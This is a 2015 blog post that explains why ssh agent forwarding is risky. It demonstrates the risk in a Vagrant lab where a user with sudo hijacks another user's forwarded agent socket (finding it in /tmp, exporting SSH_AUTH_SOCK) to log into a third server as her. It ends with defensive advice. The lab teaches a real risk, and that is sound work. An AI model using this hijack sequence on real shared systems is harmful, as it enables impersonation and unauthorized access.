---
layout: post
title: When is ssh -A insecure?
date: 2015-07-06 15:27:14 -0300
comments: true
author:
  name: Marcelo Dominugez
  email: marcelo@wyeworks.com
  twitter_handle: marpo60
  github_handle: marpo60
  image: /images/team/marcelo-dominguez.jpg
  description: Software engineer - Curious by nature - Sports lover - Tech guy
---

## Introduction

### What's the authentication agent forwarding for?

Let's start showing what `man ssh` says about it:

> `-A` Enables forwarding of the authentication agent
> connection. This can also be specified on a per-host basis in a
> configuration file.
Agent forwarding should be enabled with caution.  Users with the
ability to bypass file permissions on the remote host (for the agent's
UNIX-domain socket)
can access the local agent through the forwarded connection.  An
attacker cannot obtain key material from
the agent, however they can perform operations on the keys that
enable them to authenticate using the identities loaded into the
agent.

It tries to solve the following problem:

`Laptop -> Server A -> Server B`

User wants to connect to Server A and from Server A to Server B
forwarding all authentication requests to Laptop.

<!--more-->

### How do we use it?

{% codeblock lang:sh %}
  user@laptop$ ssh -A serverA
  user@serverA$ ssh serverB
  user@serverB$
{% endcodeblock %}

## So, when is ssh -A insecure?

The man page has the following note:

> Agent forwarding should be enabled with caution.

So, we have to be careful with this option, but what are the problems?

With the intention of gaining more insight about the problem. We'll do
an experiment, we'll set up a scenario that is far from ideal but it's
simple enough to reproduce the problem.

## Experiment

To follow this experiment you'll need to have [vagrant](https://www.vagrantup.com/) installed
in your computer. You don't need to have previous knowledge of vagrant
to follow the experiment.
All the config files used in this experiment can be found [here](https://github.com/marpo60/ssh_forward_agent_issue).

Let's start building a topology from scratch.

The topology will include 3 virtual servers and our own machine:

- host
- web (172.17.8.101)
- worker (172.17.8.102)
- secret (172.17.8.110)

Users:

- me
- Alice (Good)
- Eve (Bad)

Facts:

* The host machine is our machine where we will create the network
topology using virtual machines
* The web server is a virtual machine that will emulate a server
accessible from the internet.
* The worker server is a virtual machine that will emulate a
server accessible only from the web server.
* The secret server is a virtual machine that will emulate a
server accessible only by Alice from the internet.

Let's start the servers with `vagrant up`.

`host$ vagrant up` (This can take a while...)

First let's add all the keys to the ssh agent of the host
machine

{% codeblock lang:sh %}
  me@host$ ssh-add alice_id_rsa
  me@host$ ssh-add eve_id_rsa
{% endcodeblock %}

Now we'll open a new terminal and emulate that Alice is working
on the worker server

Note that for this experiment we set up another instance
of the ssh daemon in port 2222
in order to avoid messing with the default ssh server and
Vagrant configurations, please check the config files.

{% codeblock lang:sh %}
  me@host$ ssh -A -i alice_id_rsa -p 2222 alice@172.17.8.101
  alice@web:~$ ssh -p 2222 172.17.8.102
  alice@worker:~$
{% endcodeblock %}

Now on other terminal let's pretend to be Eve

{% codeblock lang:sh %}
  me@host$ ssh -i eve_id_rsa -p 2222 eve@172.17.8.101
{% endcodeblock %}

Eve will not use `-A` options because she doesn't need to use the
worker server

Eve finds out that alice is connected

{% codeblock lang:sh %}
  eve@web:~$ ps -aux | grep sshd | grep alice
  root      2469  0.0  0.8 107696  4252 ?        Ss   21:49   0:00
  sshd: alice [priv]
  alice     2522  0.0  0.3 107696  1952 ?        S    21:49   0:00
  sshd: alice@pts/1
  eve@web:~$
{% endcodeblock %}

And she also finds out that Alice is using `-A` because a socket
file was generated in /tmp/ssh-\*

{% codeblock lang:sh %}
  eve@web:~$ ls -lha /tmp/
  total 24K
  drwxrwxrwt  5 root    root    4.0K Jan 19 21:55 .
  drwxr-xr-x 23 root    root    4.0K Jan 19 21:34 ..
  drwxrwxrwt  2 root    root    4.0K Jan 19 21:34 .ICE-unix
  drwx------  2 alice   alice   4.0K Jan 19 21:49
  ssh-xeIzefGEYs
  -rwx--x--x  1 vagrant vagrant  676 Jan 19 21:34 vagrant-shell
  drwxrwxrwt  2 root    root    4.0K Jan 19 21:34 .X11-unix
  eve@web:~$
{% endcodeblock %}

Eve now becomes root and impersonate into Alice.

{% codeblock lang:sh %}
  eve@web:~$ sudo su
  root@web:/home/eve# export SSH_AUTH_SOCK=/tmp/ssh-xeIzefGEYs/agent.2522
  root@web:/home/eve# ssh -p 2222 alice@172.17.8.110
  alice@secret:~$
{% endcodeblock %}

So, with this simple stepts now Eve is connected to secret
machine as Alice.

## Conclusions

It's not unusual for users to have sudo permissions on shared
environments so you should avoid using
-A option if you don't trust that system. One
alternative could be to use `ProxyCommand` instead of `-A` like it
mentions [here](http://backreference.org/2010/02/26/jump-in-with-ssh-and-netcat/).

But in case you have to use the `-A` option and you don't trust the
sudoers of the shared system, create
a new pair of private and public keys for those servers,
in this way you'll reduce the risk of
compromising other servers.

Cheers!
